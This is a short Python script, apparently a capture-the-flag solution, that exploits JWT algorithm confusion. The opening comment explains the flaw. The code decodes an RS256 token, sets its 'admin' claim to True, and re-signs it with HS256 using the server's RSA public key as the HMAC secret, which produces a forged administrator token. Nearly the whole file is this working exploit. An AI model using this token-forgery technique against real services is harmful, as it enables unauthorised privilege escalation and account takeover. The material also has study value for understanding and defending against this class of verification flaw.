#the token verifiying function supports both asymetric and symmetric algorithms, so even though they use assymetric to sign the token, when a token signed with HS256 which is symmetric is passed, the signature  (pubkey) is treated as a signature/symmetric token, so the pubkey is verified against the pubkey itself.


import jwt
import base64
import json

key = {"pubkey":"-----BEGIN RSA PUBLIC KEY-----\nMIIBCgKCAQEAvoOtsfF5Gtkr2Swy0xzuUp5J3w8bJY5oF7TgDrkAhg1sFUEaCMlR\nYltE8jobFTyPo5cciBHD7huZVHLtRqdhkmPD4FSlKaaX2DfzqyiZaPhZZT62w7Hi\ngJlwG7M0xTUljQ6WBiIFW9By3amqYxyR2rOq8Y68ewN000VSFXy7FZjQ/CDA3wSl\nQ4KI40YEHBNeCl6QWXWxBb8AvHo4lkJ5zZyNje+uxq8St1WlZ8/5v55eavshcfD1\n0NSHaYIIilh9yic/xK4t20qvyZKe6Gpdw6vTyefw4+Hhp1gROwOrIa0X0alVepg9\nJddv6V/d/qjDRzpJIop9DSB8qcF1X23pkQIDAQAB\n-----END RSA PUBLIC KEY-----\n"}
token1 = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOmZhbHNlfQ.dh96aGLr9fH5PIduYzHLPYBpMiCxe2UpnzWQhx4fYybvGvuIaft6CqVr26taCxDUeTY2LmGX5eRhMfRMeNUwbosENmfY6jrXpLe3exCJNSqzCxpERjvqohAqhqtQCA81DR6e4VbKW91IQHLSY_SPfd57_qHtMlhLyHVqKVqR0WKIjaALiQVSmxfC1jdkVxW3wDFLWhwHQ3HT7ApHMfkko_salVyGwukHaKe7ch11WmM08s2dPScVA1PxPEWUP3BO1Jfau6k7T8IXLyFlAF_R2mQ0fq_k8lhkdiIEaB5c3TZyCo7CDuCPCjHVWFGXv_6Yf-YdI_46E2x8gY4JW4UTJw"
jwtdata = token1.split(".")[1]
jwtdata = base64.b64decode(jwtdata+"==").decode('utf-8')
print(jwtdata)
jwtdata = json.loads(jwtdata)
jwtdata["admin"]=True

print(jwtdata)
print(jwt.encode(jwtdata, key["pubkey"], algorithm="HS256").decode('utf-8'))
